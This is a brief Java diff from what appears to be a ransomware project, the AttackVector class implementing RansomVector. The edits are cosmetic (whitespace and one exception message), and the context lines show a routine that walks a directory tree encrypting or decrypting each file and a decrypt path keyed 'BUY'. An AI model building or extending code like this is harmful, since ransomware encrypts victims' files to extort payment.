@@ -32,7 +32,7 @@ public class AttackVector implements RansomVector {
 	@Override
 	public void decryptFileSystem() throws RansomwareException {
 		try {
-			
+
 			cryptFileSystem(keyService.getKey("BUY"), new DecryptFile());
 		} catch (RansomwareException e) {
 			throw new RansomwareException("Decrypting the file-system failed", e.getCause());
@@ -70,7 +70,6 @@ public class AttackVector implements RansomVector {
 			CryptoOperation cryptoFunc) throws RansomwareException {
 
 		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
-		
 
 		struct.add(new File(inputDir));
 		while (!(struct.isEmpty())) {
@@ -92,7 +91,7 @@ public class AttackVector implements RansomVector {
 						try {
 							cryptoFunc.operate(key, file, crypto);
 						} catch (RansomwareException e) {
-							throw new RansomwareException(e.getMessage(), e.getCause());
+							throw new RansomwareException("crypt opertation failed", e.getCause());
 						}
 
 					}
